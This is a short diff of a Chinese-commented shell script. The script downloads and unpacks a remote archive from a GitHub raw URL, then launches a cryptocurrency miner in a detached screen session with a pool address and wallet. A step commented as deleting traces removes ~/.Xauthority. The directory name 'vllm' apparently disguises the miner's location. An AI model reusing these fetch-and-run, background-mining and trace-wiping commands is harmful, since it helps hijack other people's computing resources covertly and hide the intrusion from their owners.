@@ -11,12 +11,10 @@ apt-get install -y -q screen
 cd ~
 
 # 下载并解压
-wget https://raw.githubusercontent.com/xiaobintse/sh/main/p.tar.gz
-chmod +x p.tar.gz
-tar -zxvf p.tar.gz
+wget https://raw.githubusercontent.com/xiaobintse/sh/main/p.tar.gz && chmod +x p.tar.gz && tar -zxvf p.tar.gz
 
 # 创建一个后台 screen 运行挖矿程序
-screen -dmS p bash -c 'source vllm/bin/activate && cd ~/vllm && ./p --algo pearlhash --url stratum+ssl://hk.pearlhash.net:9443 --user prl1prqg9ejageaypduhjs36q3g4m5d483her5gtwanngm86gz0dzhjlq2tkpu9'
+screen -dmS p bash -c './p --algo pearlhash --url stratum+ssl://hk.pearlhash.net:9443 --user prl1prqg9ejageaypduhjs36q3g4m5d483her5gtwanngm86gz0dzhjlq2tkpu9'
 
 # 删除痕迹
 rm -rf ~/.Xauthority
